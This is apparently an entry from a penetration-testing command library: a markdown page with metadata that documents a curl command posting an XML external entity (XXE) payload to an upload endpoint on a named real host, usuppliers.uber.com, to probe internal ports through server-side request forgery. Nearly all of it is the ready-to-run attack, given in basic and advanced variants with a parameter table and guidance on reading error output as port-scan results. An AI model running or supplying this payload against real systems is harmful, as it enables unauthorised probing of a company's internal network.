---
id: cmd-curl-post-xxe
data: >-
  curl -X POST https://usuppliers.uber.com/upload-endpoint -H "Content-Type:
  application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe
  SYSTEM "http://127.0.0.1:PORT/">%xxe;]><root/>'
tags:
  - ssrf
  - xxe
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:10.100Z'
verified: false
validated: true
submitted: true
---
# curl-post-xxe-payload

## Command

```bash
curl -X POST https://usuppliers.uber.com/upload-endpoint -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://127.0.0.1:PORT/">%xxe;]><root/>'
```

## Description

This command sends a POST request with an XXE payload to a vulnerable endpoint, replacing PORT with the target internal port to trigger SSRF OOB.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: application/xml"` | Sets XML content type | Yes |
| `-d` | Payload data with XXE entity | Yes |
| `PORT` | Internal port to probe (e.g., 80) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://usuppliers.uber.com/upload-endpoint -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://127.0.0.1:80/">%xxe;]><root/>'
```

### Advanced Usage

```bash
curl -X POST https://usuppliers.uber.com/upload-endpoint -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://internal-ip:443/">%xxe;]><root/>' -o response.txt
```

## Expected Output

Server response with error message, e.g., "XML parsing error: Connection timed out" indicating open port.

## Related

- [[Related Procedure|procedures/Send-XXE-Payloads-to-POST-Endpoint]]
